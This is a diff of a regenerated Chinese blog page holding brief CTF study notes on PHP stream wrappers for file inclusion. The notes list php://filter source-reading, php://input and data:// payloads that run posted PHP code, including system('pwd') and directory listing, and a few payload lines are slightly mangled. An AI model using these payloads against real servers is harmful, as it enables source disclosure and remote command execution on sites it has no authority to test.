@@ -34,13 +34,13 @@
   <!-- 页面元数据 -->
   <title>php伪协议学习 - Dr4x3zz</title>
   <meta name="keywords" content="ctfweb,null">
-  <meta desc name="description" content="php伪协议学习笔记 - Dr4x3zz - Dr4x3zz">
+  <meta desc name="description" content="# php 伪协议学习笔记 - Dr4x3zz - Dr4x3zz">
   
 <meta property="og:type" content="article">
 <meta property="og:title" content="php伪协议学习">
 <meta property="og:url" content="https://chenzhengkai10.github.io/2022/10/30/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/index.html">
 <meta property="og:site_name" content="Dr4x3zz">
-<meta property="og:description" content="php伪协议学习笔记">
+<meta property="og:description" content="# php 伪协议学习笔记">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
 <meta property="article:published_time" content="2022-10-30T11:24:36.000Z">
@@ -1744,7 +1744,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     debug: "env",
     cdn: {"js":{"app":"/js/app.js","parallax":"/js/plugins/parallax.js","rightMenu":"/js/plugins/rightMenu.js","rightMenus":"/js/plugins/rightMenus.js","sites":"/js/plugins/tags/sites.js","friends":"/js/plugins/tags/friends.js","contributors":"/js/plugins/tags/contributors.js","search":"/js/search/hexo.js"},"css":{"style":"/css/style.css"}},
     default: {"avatar":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/image/2659360.svg"},
-    lastupdate: new Date(1728903825782),
+    lastupdate: new Date(1728904039860),
     sidebar: {
       for_page: ["blogger","category","tagcloud","donate"],
       for_post: ["toc"],
@@ -2585,7 +2585,8 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <div id="layoutHelper-page-plugins"></div>
   <div id="post-body" itemprop="articleBody">
-    <h1 id="php伪协议学习笔记"><a href="#php伪协议学习笔记" class="headerlink" title="php伪协议学习笔记"></a>php伪协议学习笔记</h1><span id="more"></span>
+    <h1 id="php伪协议学习笔记"><a class="markdownIt-Anchor" href="#php伪协议学习笔记">#</a> php 伪协议学习笔记</h1>
+<span id="more"></span>
 <table>
 <thead>
 <tr>
@@ -2593,70 +2594,84 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <th>用法</th>
 </tr>
 </thead>
-<tbody><tr>
-<td>file:&#x2F;&#x2F;</td>
-<td>?file&#x3D;file:&#x2F;&#x2F;D:phpstuy&#x2F;WWW&#x2F;phpcode.txt</td>
+<tbody>
+<tr>
+<td>file://</td>
+<td>?file=file://D:phpstuy/WWW/phpcode.txt</td>
 </tr>
 <tr>
-<td>php:&#x2F;&#x2F;filter</td>
-<td>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</td>
+<td>php://filter</td>
+<td>?file=php://filter/read=convert.base64-encode/resource=index.php</td>
 </tr>
 <tr>
-<td>php:&#x2F;&#x2F;input</td>
-<td>?file&#x3D;php:&#x2F;&#x2F;input    [POST DATA] <?php phpinfo()?></td>
+<td>php://input</td>
+<td>?file=php://input    [POST DATA] <?php phpinfo()?></td>
 </tr>
 <tr>
-<td>zip:&#x2F;&#x2F;</td>
-<td>?file&#x3D;zip:&#x2F;&#x2F;D:&#x2F;phpstudy&#x2F;WWW&#x2F;file.zip%23phpcode.txt</td>
+<td>zip://</td>
+<td>?file=zip://D:/phpstudy/WWW/file.zip%23phpcode.txt</td>
 </tr>
 <tr>
-<td>compress.bzip2:&#x2F;&#x2F;</td>
-<td>?file&#x3D;compress.bzip2:&#x2F;&#x2F;D:&#x2F;phpstudy&#x2F;WWW&#x2F;file.bz2<br>[or]<br>?file&#x3D;compress.bzip2:&#x2F;&#x2F;.&#x2F;file.bz2</td>
+<td>compress.bzip2://</td>
+<td>?file=compress.bzip2://D:/phpstudy/WWW/file.bz2<br>[or]<br>?file=compress.bzip2://./file.bz2</td>
 </tr>
 <tr>
-<td>compress.zlib:&#x2F;&#x2F;</td>
-<td>?file&#x3D;compress.zlib:&#x2F;&#x2F;D:&#x2F;phpstudy&#x2F;WWW&#x2F;file.gz<br>[or]<br>?file&#x3D;compress.zlib:&#x2F;&#x2F;.&#x2F;file.gz</td>
+<td>compress.zlib://</td>
+<td>?file=compress.zlib://D:/phpstudy/WWW/file.gz<br>[or]<br>?file=compress.zlib://./file.gz</td>
 </tr>
 <tr>
-<td>data:&#x2F;&#x2F;</td>
-<td>?file&#x3D;data:&#x2F;&#x2F;data:&#x2F;&#x2F;text&#x2F;plain,<?php phpinfo()?><br>[or]<br>?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;<br>也可以<br>?file&#x3D;data.text&#x2F;plain,<?php phpinfo()?><br>[or]<br>?file&#x3D;data.text&#x2F;plain:base64,PD9waHAgcGhwaW5mbyqpPz4&#x3D;</td>
+<td>data://</td>
+<td>?file=data://data://text/plain,<?php phpinfo()?><br>[or]<br>?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=<br>也可以<br>?file=data.text/plain,<?php phpinfo()?><br>[or]<br>?file=data.text/plain:base64,PD9waHAgcGhwaW5mbyqpPz4=</td>
 </tr>
-</tbody></table>
-<h2 id="input"><a href="#input" class="headerlink" title="input"></a>input</h2><blockquote>
-<p>变量&#x3D;php:&#x2F;&#x2F;input，然后同时post想运行的语句<br>场景：文件包含<br>在bp中输入 &lt; ?php phpinfo() ? &gt; 抓包，就能出现php input的信息<br>执行pwd命令可以查看当前目录 Post data 输入 &lt; ?php system(“pwd”);? &gt;</p>
+</tbody>
+</table>
+<h2 id="input"><a class="markdownIt-Anchor" href="#input">#</a> input</h2>
+<blockquote>
+<p>变量 = php://input，然后同时 post 想运行的语句<br>
+场景：文件包含<br>
+在 bp 中输入 &lt;?php phpinfo () ? &gt; 抓包，就能出现 php input 的信息<br>
+执行 pwd 命令可以查看当前目录 Post data 输入 &lt;?php system (“pwd”);? &gt;</p>
 </blockquote>
 <blockquote>
-<p>ls..可以访问上一级目录 Post data 输入 &lt; ?php system(“ls..”);? &gt;<br>ls..&#x2F;..访问上一级的上一级目录 Post data 输入 &lt; ?php system(“ls..&#x2F;..”);? &gt;</p>
+<p>ls… 可以访问上一级目录 Post data 输入 &lt;?php system (“ls…”);? &gt;<br>
+ls…/… 访问上一级的上一级目录 Post data 输入 &lt;?php system (“ls…/…”);? &gt;</p>
 </blockquote>
-<h2 id="file"><a href="#file" class="headerlink" title="file"></a>file</h2><blockquote>
-<p>用于访问服务端本地文件，用绝对地址访问<br>文件包含<br>访问本地文件</p>
+<h2 id="file"><a class="markdownIt-Anchor" href="#file">#</a> file</h2>
+<blockquote>
+<p>用于访问服务端本地文件，用绝对地址访问<br>
+文件包含<br>
+访问本地文件</p>
 </blockquote>
-<h2 id="filter"><a href="#filter" class="headerlink" title="filter"></a>filter</h2><table>
+<h2 id="filter"><a class="markdownIt-Anchor" href="#filter">#</a> filter</h2>
+<table>
 <thead>
 <tr>
 <th>名称</th>
 <th>描述</th>
 </tr>
 </thead>
-<tbody><tr>
-<td>resource&#x3D;&lt;要过滤的数据流&gt;</td>
+<tbody>
+<tr>
+<td>resource=&lt;要过滤的数据流&gt;</td>
 <td>这个参数是必须的。指定了你要筛选过滤的数据流。</td>
 </tr>
 <tr>
-<td>read&#x3D;&lt;独链的筛选列表&gt;</td>
-<td>这个参数是可选的。可以设定一个或多个过滤器名称，以（&#x2F;）分隔</td>
+<td>read=&lt;独链的筛选列表&gt;</td>
+<td>这个参数是可选的。可以设定一个或多个过滤器名称，以（/）分隔</td>
 </tr>
 <tr>
-<td>write&#x3D;&lt;写链的筛选列表&gt;</td>
-<td>这个参数是可选的。可以设定一个或多个过滤器名称以（&#x2F;）分隔</td>
+<td>write=&lt;写链的筛选列表&gt;</td>
+<td>这个参数是可选的。可以设定一个或多个过滤器名称以（/）分隔</td>
 </tr>
 <tr>
 <td>&lt;；两个筛选列表&gt;</td>
-<td>任何没有以read&#x3D;或write&#x3D;做前缀的筛选器列表会视情况应用于读或写链。</td>
+<td>任何没有以 read = 或 write = 做前缀的筛选器列表会视情况应用于读或写链。</td>
 </tr>
-</tbody></table>
+</tbody>
+</table>
 <blockquote>
-<p>范式：变量&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64&#x2F;resource&#x3D;文件名<br>再用base64解码器解码</p>
+<p>范式：变量 = php://filter/convert.base64/resource = 文件名<br>
+再用 base64 解码器解码</p>
 </blockquote>
 
   </div>
@@ -2708,7 +2723,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://chenzhengkai10.github.io/2022/10/30/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/&title=php伪协议学习 - Dr4x3zz&summary=php伪协议学习笔记"
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://chenzhengkai10.github.io/2022/10/30/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/&title=php伪协议学习 - Dr4x3zz&summary=# php 伪协议学习笔记"
           
           >
           
@@ -2720,7 +2735,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://chenzhengkai10.github.io/2022/10/30/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/&title=php伪协议学习 - Dr4x3zz&summary=php伪协议学习笔记"
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://chenzhengkai10.github.io/2022/10/30/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/&title=php伪协议学习 - Dr4x3zz&summary=# php 伪协议学习笔记"
           
           >
           
@@ -2732,7 +2747,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://service.weibo.com/share/share.php?url=https://chenzhengkai10.github.io/2022/10/30/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/&title=php伪协议学习 - Dr4x3zz&summary=php伪协议学习笔记"
+          target="_blank" href="http://service.weibo.com/share/share.php?url=https://chenzhengkai10.github.io/2022/10/30/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/&title=php伪协议学习 - Dr4x3zz&summary=# php 伪协议学习笔记"
           
           >
           
@@ -2767,17 +2782,19 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class='prev' href='/2022/12/20/php%E5%AD%A6%E4%B9%A02022-12-20/'>
           <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>php学习2022-12-20</p>
-          <p class='content'>php学习(EOF、数据变量)
-
-打印Hello World！123&lt;?php    echo &quot;Hello World!&quot;;?&gt;
-php EOF输出一段要输出的...</p>
+          <p class='content'># php 学习 (EOF、数据变量)
+# 
+# 打印 Hello World！
+123&lt;?php    echo &quot;Hello World!&quot;;?&gt;
+# php...</p>
         </a>
       
       
         <a class='next' href='/2022/10/23/php%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A02022-10-23/'>
           <p class='title'>php语法学习2022/10/23<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
-          <p class='content'>php学习(global和static)
-123456789101112&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;h1&gt;My fir...</p>
+          <p class='content'># php 学习 (global 和 static)
+
+123456789101112&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;h1&gt...</p>
         </a>
       
     </div>
@@ -2835,7 +2852,7 @@ php EOF输出一段要输出的...</p>
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#input"><span class="toc-text">input</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#file"><span class="toc-text">file</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#filter"><span class="toc-text">filter</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#input"><span class="toc-text"> input</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#file"><span class="toc-text"> file</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#filter"><span class="toc-text"> filter</span></a></li></ol>
     </div>
   </section>
 
@@ -3405,7 +3422,7 @@ php EOF输出一段要输出的...</p>
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Dr4x3zz","url":"https://chenzhengkai10.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Dr4x3zz","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://chenzhengkai10.github.io/","sameAs":["https://github.com/volantis-x"],"description":"这是我的专属博客"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https://chenzhengkai10.github.io/","name":"Dr4x3zz"}},{"@type":"ListItem","position":2,"item":{"@id":"https://chenzhengkai10.github.io/categories/ctfweb/","name":"ctfweb"}},{"@type":"ListItem","position":3,"item":{"@id":"https://chenzhengkai10.github.io/2022/10/30/php伪协议学习/","name":"php伪协议学习"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Dr4x3zz","url":"https://chenzhengkai10.github.io/","keywords":null,"description":"这是我的专属博客","author":{"@type":"Person","name":"Dr4x3zz","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://chenzhengkai10.github.io/","description":"这是我的专属博客"},"publisher":{"@type":"Organization","name":"Dr4x3zz","url":"https://chenzhengkai10.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"https://chenzhengkai10.github.io?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"php伪协议学习","description":"php伪协议学习笔记","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https://chenzhengkai10.github.io/2022/10/30/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/"},"author":{"@type":"Person","name":"Dr4x3zz","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://chenzhengkai10.github.io/"},"publisher":{"@type":"Organization","name":"Dr4x3zz","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"https://chenzhengkai10.github.io/2022/10/30/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/","wordCount":10,"datePublished":"2022-10-30T11:24:36.000Z","dateModified":"2023-04-28T13:35:12.000Z","articleSection":"ctfweb","keywords":"ctfweb","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Dr4x3zz","url":"https://chenzhengkai10.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Dr4x3zz","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://chenzhengkai10.github.io/","sameAs":["https://github.com/volantis-x"],"description":"这是我的专属博客"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https://chenzhengkai10.github.io/","name":"Dr4x3zz"}},{"@type":"ListItem","position":2,"item":{"@id":"https://chenzhengkai10.github.io/categories/ctfweb/","name":"ctfweb"}},{"@type":"ListItem","position":3,"item":{"@id":"https://chenzhengkai10.github.io/2022/10/30/php伪协议学习/","name":"php伪协议学习"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Dr4x3zz","url":"https://chenzhengkai10.github.io/","keywords":null,"description":"这是我的专属博客","author":{"@type":"Person","name":"Dr4x3zz","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://chenzhengkai10.github.io/","description":"这是我的专属博客"},"publisher":{"@type":"Organization","name":"Dr4x3zz","url":"https://chenzhengkai10.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"https://chenzhengkai10.github.io?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"php伪协议学习","description":"# php 伪协议学习笔记","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https://chenzhengkai10.github.io/2022/10/30/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/"},"author":{"@type":"Person","name":"Dr4x3zz","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://chenzhengkai10.github.io/"},"publisher":{"@type":"Organization","name":"Dr4x3zz","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"https://chenzhengkai10.github.io/2022/10/30/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/","wordCount":13,"datePublished":"2022-10-30T11:24:36.000Z","dateModified":"2023-04-28T13:35:12.000Z","articleSection":"ctfweb","keywords":"ctfweb","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
